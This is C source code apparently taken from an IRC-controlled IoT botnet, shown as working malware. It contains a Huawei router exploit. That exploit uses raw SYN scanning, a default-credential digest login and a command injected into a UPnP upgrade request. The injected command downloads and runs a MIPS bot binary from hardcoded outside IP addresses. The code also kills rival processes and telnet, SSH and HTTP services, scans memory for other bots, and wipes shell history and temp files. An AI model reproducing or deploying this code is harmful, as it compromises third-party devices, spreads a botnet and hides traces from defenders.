    memcpy(msg, initial_msg, initial_len);
    msg[initial_len] = 0x80; // append the "1" bit; most significant bit is "first"
    for (offset = initial_len + 1; offset < new_len; offset++)
        msg[offset] = 0; // append "0" bits

    // append the len in bits at the end of the buffer.
    to_bytes(initial_len*8, msg + new_len);
    // initial_len>>29 == initial_len*8>>32, but avoids overflow.
    to_bytes(initial_len>>29, msg + new_len + 4);

    // Process the message in successive 512-bit chunks:
    //for each 512-bit chunk of message:
    for(offset=0; offset<new_len; offset += (512/8)) {

        // break chunk into sixteen 32-bit words w[j], 0 ≤ j ≤ 15
        for (i = 0; i < 16; i++)
            w[i] = to_int32(msg + offset + i*4);

        // Initialize hash value for this chunk:
        a = h0;
        b = h1;
        c = h2;
        d = h3;

        // Main loop:
        for(i = 0; i<64; i++) {

            if (i < 16) {
                f = (b & c) | ((~b) & d);
                g = i;
            } else if (i < 32) {
                f = (d & b) | ((~d) & c);
                g = (5*i + 1) % 16;
            } else if (i < 48) {
                f = b ^ c ^ d;
                g = (3*i + 5) % 16;
            } else {
                f = c ^ (b | (~d));
                g = (7*i) % 16;
            }

            temp = d;
            d = c;
            c = b;
            b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
            a = temp;

        }

        // Add this chunk's hash to result so far:
        h0 += a;
        h1 += b;
        h2 += c;
        h3 += d;

    }

    // cleanup
    free(msg);

    //var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)
    to_bytes(h0, digest);
    to_bytes(h1, digest + 4);
    to_bytes(h2, digest + 8);
    to_bytes(h3, digest + 12);
}
char *str2md5(char *str, int length) {
        uint8_t result[16];
		char *out;
		out = malloc(33);
        md5((uint8_t*)str, length, result);

        snprintf(out, 33, "%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x", result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7], result[8], result[9], result[10], result[11], result[12], result[13], result[14], result[15]);
    return out;
}
void huawei_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    huawei_scanner_pid = fork();
    if(huawei_scanner_pid > 0 || huawei_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    huawei_fake_time = time(NULL);
    huawei_conn_table = calloc(HUAWEI_SCANNER_MAX_CONNS, sizeof(struct huawei_scanner_connection));
    for(i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++)
    {
        huawei_conn_table[i].state = HUAWEI_SC_CLOSED;
        huawei_conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if((huawei_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }
    fcntl(huawei_rsck, F_SETFL, O_NONBLOCK | fcntl(huawei_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(huawei_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(huawei_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)huawei_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(37215);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

	#ifdef DEBUG
        printf("[huawei] scanner process initialized. scanning started.\n");
    #endif
	
    // Main logic loop
    while(1)
    {
        fd_set fdset_rd, fdset_wr;
        struct huawei_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if(huawei_fake_time != last_spew)
        {
            last_spew = huawei_fake_time;

            for(i = 0; i < HUAWEI_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)huawei_scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_huawei_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = htons(37215);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(huawei_rsck, huawei_scanner_rawpkt, sizeof(huawei_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while(1)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct huawei_scanner_connection *conn;

            errno = 0;
            n = recvfrom(huawei_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(37215))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < HUAWEI_SCANNER_MAX_CONNS; n++)
            {
                if(huawei_conn_table[n].state == HUAWEI_SC_CLOSED)
                {
                    conn = &huawei_conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            huawei_setup_connection(conn);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for(i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;

            conn = &huawei_conn_table[i];
            //timeout = (conn->state > HUAWEI_SC_CONNECTING ? 30 : 5);

            if(conn->state != HUAWEI_SC_CLOSED && (huawei_fake_time - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = HUAWEI_SC_CLOSED;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                continue;
            }

            if(conn->state == HUAWEI_SC_CONNECTING || conn->state == HUAWEI_SC_EXPLOIT_STAGE2)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != HUAWEI_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        huawei_fake_time = time(NULL);

        for(i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++)
        {
            conn = &huawei_conn_table[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == HUAWEI_SC_EXPLOIT_STAGE2)
                    {
						#ifdef DEBUG
							printf("[huawei] FD%d exploit_stage=2. sending POST /ctrlt/DeviceUpgrade_1 to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
						#endif
						
						util_strcpy(conn->payload_buf, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 484\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 45.145.185.229 -l /tmp/.unstable -r /bins/keksec.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
						util_zero(conn->nonce_buf, sizeof(conn->nonce_buf));
						int v;
						 v = fcntl(conn->fd, F_GETFD, 0);
						  v &= ~O_NONBLOCK;
						if(recv(conn->fd, conn->nonce_buf, sizeof(conn->nonce_buf), 0) < 0) {
							
							close(conn->fd);
							conn->fd = -1;
							conn->state = HUAWEI_SC_CLOSED;
							continue;
					    } else if(strstr(conn->nonce_buf, "nonce=\"") != NULL) {
							util_strcpy(conn->nonce, extract_between(conn->nonce_buf, "nonce=\"", "\", qop=\"auth\""));
						
						} else {														
							close(conn->fd);
							conn->fd = -1;
							conn->state = HUAWEI_SC_CLOSED;
							continue;
						}
						
						
                        #ifdef DEBUG
							printf("[huawei] %d.%d.%d.%d exploit_stage=3. repeating request with proper nonce\n", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
						#endif
						char *ha1a = "dslf-config:HuaweiHomeGateway:admin";
						char *ha1b = malloc(33);
						
						sprintf(ha1b, "%s", str2md5(ha1a, strlen(ha1a)));

						char *ha2a = "POST:/ctrlt/DeviceUpgrade_1";
						char *ha2b = malloc(33);
						sprintf(ha2b, "%s", str2md5(ha2a, strlen(ha2a)));
						char *responsea = malloc(130);
						sprintf(responsea, "%s:%s:00000001:248d1a2560100669:auth:%s", ha1b, conn->nonce, ha2b);
						char *responseb = malloc(33);
						sprintf(responseb, "%s", str2md5(responsea, strlen(responsea)));
						

						sprintf(conn->payload_buf, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 484\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"%s\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"%s\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 107.174.133.119 -l /tmp/.unstable -r /bins/keksec.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>", conn->nonce, responseb);
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
						if(recv(conn->fd, conn->nonce_buf, sizeof(conn->nonce_buf), 0) < 0) {
							
							close(conn->fd);
							conn->fd = -1;
							conn->state = HUAWEI_SC_CLOSED;
							continue;
					   
						} else {														
							close(conn->fd);
							conn->fd = -1;
							conn->state = HUAWEI_SC_CLOSED;
							continue;
						}
                        #ifdef DEBUG
							printf("[huawei] FD%d exploit_stage=4. closing connection\n", conn->fd);
						#endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HUAWEI_SC_CLOSED;
						continue;
					}
                    else
                    {
                        #ifdef DEBUG
							printf("[huawei] FD%d exploit_stage=1. connection to %d.%d.%d.%d successful. proceeding to stage 2\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
						#endif
                        conn->state = HUAWEI_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
					close(conn->fd);
                    conn->fd = -1;
                    conn->state = HUAWEI_SC_CLOSED;

                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(1)
                {
                    int ret = 0;

                    if(conn->state == HUAWEI_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == HUAWEI_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + HUAWEI_SCANNER_HACK_DRAIN, HUAWEI_SCANNER_RDBUF_SIZE - HUAWEI_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= HUAWEI_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = huawei_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, HUAWEI_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == HUAWEI_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                huawei_setup_connection(conn);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = HUAWEI_SC_CLOSED;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = huawei_fake_time;

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}
void ak47scan(int sock) {
    uint32_t parent;
    parent = fork();
    int forks = sysconf(_SC_NPROCESSORS_ONLN)*2; //2 scan fork for each CPU core.
    if (parent > 0) {
        scanPid = parent;
        return;
    } else if (parent == -1) return;
	int fds = forks * 512;
    int ii;
	    int get;

    for (ii = 0; ii < forks; ii++) {
        srand(time(NULL) ^ getpid() * forks);

		if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
			ak47telscan(1000, fds, sock);
		}else{
			huawei_init();
			realtekscanner_scanner_init();
			scanner_init(sock);
		}
		//madIPCamHax();
    }
    return;
}

void ak47scantoggle(int sock, char *sender, int argc, char ** argv) {
    if (argc < 1) {
        Send(sock, "NOTICE %s :AK47SCAN <ON/OFF>\n", sender);
        return;
    }
    if (!strcmp(argv[1], "ON")) {
        if (scanPid == 0) {
            ak47scan(sock);
            if (scanPid != 0) {
                Send(sock, "PRIVMSG %s :[AK-47] [+] AK-47 SCANNER STARTED!\n", CHAN); //Scanner has been started successfully!!!
                return;
            } else {
                Send(sock, "PRIVMSG %s :[AK-47] [-] FAILED TO START AK-47 SCANNER!\n", CHAN);
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :[AK-47] [+] AK-47 SCANNER ALREADY STARTED!\n", CHAN);
            return;
        }
    }
    if (!strcmp(argv[1], "OFF")) {
        if (scanPid != 0) {
            if (kill(scanPid, 9) == 0) {
                Send(sock, "PRIVMSG %s :[AK-47] [+] AK-47 SCANNER KILLED!\n", CHAN);
                scanPid = 0;
                return;
            } else {
                Send(sock, "PRIVMSG %s :[AK-47] [-] FAILED TO KILL AK-47 SCANNER!\n", CHAN);
                return;
            }
        } else {
            Send(sock, "PRIVMSG %s :[AK-47] [+] AK-47 SCANNER NOT STARTED!\n", CHAN);
            return;
        }
    } else {
        Send(sock, "NOTICE %s :[AK-47] [+] AK47SCAN <ON/OFF>\n", sender);
        return;
    }
}

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

int util_strlen(char *str) {
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}
int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
    killer_kill_by_port(htons(23));
    
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    killer_kill_by_port(htons(22));
    
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    killer_kill_by_port(htons(80));
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // In case the binary is getting deleted, we want to get the REAL realpath
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir("/proc/")) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, "/proc/");
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, "/status");

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            } 

            

            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }
}

int killer_kill_by_port(int port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = 0;
            int listening_state = 0;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if (in_column == 1)
                        column_index++;

                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }

                    in_column = 0;
                }
            }
            ii = i;

            if (listening_state == 0)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0) {
        return 0;
    }

    if ((dir = opendir("/proc/")) != NULL) {
        while ((entry = readdir(dir)) != NULL && ret == 0) {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, "/proc/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}

int has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, "/proc/");
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, "/exe");

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return 0;
    }
    close(fd);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}
void hex2bin(const char* in, size_t len, unsigned char* out) {

  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };

  static const unsigned char *LOOKUP = TBL - 48;

  const char* end = in + len;

  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];

}
int memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))){
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
        
    }

    close(fd);

    return found;
}

int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}

void ClearHistory() {
    system("history -c;history -w");
    system("cd /root;rm -f .bash_history");
    system("cd /var/tmp; rm -f *");
}

void move(int sock, char *sender, int argc, char ** argv) {
    if (argc < 1) {
        Send(sock, "NOTICE %s :MOVE <server>\n", sender);
        exit(1);
    }
    server = strdup(argv[1]);
    changeservers = 1;
    close(sock);
}

